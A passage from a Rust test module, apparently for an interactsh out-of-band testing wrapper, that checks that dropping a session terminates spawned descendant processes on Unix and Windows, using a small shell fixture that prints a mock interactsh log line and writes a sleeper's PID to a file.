    }

    #[cfg(windows)]
    #[tokio::test]
    async fn windows_drop_terminates_interactsh_descendants() {
        let _session_guard = SESSION_TEST_LOCK.lock().await;
        let directory = tempfile::tempdir().expect("temporary directory");
        let pid_file = directory.path().join("windows-drop-descendant.pid");

        let session = start_windows_oob_fixture(&pid_file)
            .await
            .expect("start Windows OOB descendant fixture");
        let descendant = wait_for_windows_oob_fixture_pid(&pid_file).await;
        drop(session);

        assert_windows_oob_process_exits(descendant).await;
    }

    #[cfg(unix)]
    fn write_descendant_fixture(directory: &Path, pid_file: &Path) -> PathBuf {
        let script = directory.join(format!(
            "interactsh-descendant-fixture-{}",
            pid_file.file_stem().and_then(std::ffi::OsStr::to_str).unwrap_or("process")
        ));
        std::fs::write(
            &script,
            format!(
                "#!/bin/sh\nprintf '%s\\n' '[INF] descendant123.oast.fun'\nsleep 60 &\nprintf '%s' \"$!\" > '{}'\nwait\n",
                pid_file.display()
            ),
        )
        .expect("write descendant fixture client");
        script
    }

    #[cfg(unix)]
    async fn wait_for_fixture_pid(path: &Path) -> rustix::process::Pid {
        for _ in 0..100 {
            if let Ok(raw) = std::fs::read_to_string(path) {
                if let Ok(raw_pid) = raw.trim().parse::<i32>() {
                    if let Some(pid) = rustix::process::Pid::from_raw(raw_pid) {
                        return pid;
                    }
                }
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
        panic!("descendant PID fixture was not created at {}", path.display());
    }

    #[cfg(unix)]
    async fn assert_process_exits(pid: rustix::process::Pid) {
        for _ in 0..100 {
            if matches!(rustix::process::test_kill_process(pid), Err(rustix::io::Errno::SRCH)) {
                return;
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
        panic!("interactsh descendant {pid:?} survived process-tree cleanup");
    }

    #[cfg(windows)]
    async fn wait_for_windows_oob_fixture_pid(path: &Path) -> u32 {
        for _ in 0..500 {
            if let Ok(raw) = std::fs::read_to_string(path) {
                if let Ok(pid) = raw.trim().parse() {
                    return pid;
                }
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
        panic!("OOB descendant PID fixture was not created at {}", path.display());
    }

    #[cfg(windows)]
    async fn assert_windows_oob_process_exits(pid: u32) {
        for _ in 0..100 {
            if !windows_oob_process_is_running(pid) {
                return;
            }
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
        panic!("Windows OOB descendant process {pid} survived process-tree cleanup");
    }

    #[cfg(windows)]
    fn windows_oob_process_is_running(pid: u32) -> bool {
        let filter = format!("PID eq {pid}");
        let output_format = concat!("/", "F", "O");
        let output = std::process::Command::new("tasklist.exe")
            .args(["/FI", &filter, output_format, "CSV", "/NH"])
            .output()
            .expect("query Windows OOB process state");
        assert!(output.status.success(), "tasklist failed: {output:?}");
        String::from_utf8_lossy(&output.stdout).contains(&format!("\"{pid}\""))
    }
}
